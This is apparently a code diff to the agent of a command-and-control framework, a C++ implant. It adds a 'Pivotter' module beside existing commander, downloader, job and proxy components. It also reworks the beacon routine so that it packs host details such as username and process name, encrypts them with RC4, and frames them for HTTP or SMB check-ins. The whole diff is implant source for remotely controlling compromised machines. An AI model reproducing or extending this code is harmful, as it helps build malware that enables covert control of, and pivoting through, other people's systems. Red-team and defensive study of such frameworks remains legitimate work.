@@ -2,7 +2,6 @@
 #include "ApiLoader.h"
 #include "utils.h"
 #include "Packer.h"
-#include "Encoders.h"
 #include "Crypt.h"
 
 Agent::Agent()
@@ -13,20 +12,23 @@ Agent::Agent()
 	config  = (AgentConfig*) MemAllocLocal(sizeof(AgentConfig));
 	*config = AgentConfig();
 
-	commander = (Commander*) MemAllocLocal(sizeof(AgentConfig));
+	commander  = (Commander*) MemAllocLocal(sizeof(AgentConfig));
 	*commander = Commander(this);
 
 	downloader  = (Downloader*) MemAllocLocal(sizeof(Downloader));
 	*downloader = Downloader( config->download_chunk_size );
 
-	jober = (JobsController*)MemAllocLocal(sizeof(JobsController));
+	jober  = (JobsController*)MemAllocLocal(sizeof(JobsController));
 	*jober = JobsController();
 
 	memorysaver  = (MemorySaver*)MemAllocLocal(sizeof(MemorySaver));
 	*memorysaver = MemorySaver();
 
-	proxyfire = (Proxyfire*)MemAllocLocal(sizeof(Proxyfire));
+	proxyfire  = (Proxyfire*)MemAllocLocal(sizeof(Proxyfire));
 	*proxyfire = Proxyfire();
+
+	pivotter  = (Pivotter*)MemAllocLocal(sizeof(Pivotter));
+	*pivotter = Pivotter();
 
 	SessionKey = (PBYTE) MemAllocLocal(16);
 	for (int i = 0; i < 16; i++)
@@ -45,7 +47,7 @@ BOOL Agent::IsActive()
 	return this->config->active;
 }
 
-LPSTR Agent::BuildBeat()
+BYTE* Agent::BuildBeat(ULONG* size)
 {
 	BYTE flag = 0;
 	flag += this->info->is_server; 
@@ -79,12 +81,28 @@ LPSTR Agent::BuildBeat()
 	packer->PackStringA(this->info->username);
 	packer->PackStringA(this->info->process_name);
 
-	PBYTE beat = packer->data();
+	EncryptRC4(packer->data(), packer->datasize(), this->config->encrypt_key, 16);
+
+
+#if defined(BEACON_HTTP) 
+
 	ULONG beat_size = packer->datasize();
+	PBYTE beat      = packer->data();
 
-	EncryptRC4(beat, beat_size, this->config->encrypt_key, 16);
+#elif defined(BEACON_SMB) 
 
-	LPSTR encoded_beat = b64_encode(beat, beat_size);
+	ULONG beat_size = packer->datasize() + 4;
+	PBYTE beat      = (PBYTE)MemAllocLocal(beat_size);
 
-	return encoded_beat;
+	memcpy(beat, &(this->config->listener_type), 4);
+	memcpy(beat+4, packer->data(), packer->datasize());
+
+	PBYTE pdata = packer->data();
+	MemFreeLocal((LPVOID*)&pdata, packer->datasize());
+	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
+
+#endif
+
+	*size = beat_size;
+	return beat;
 }
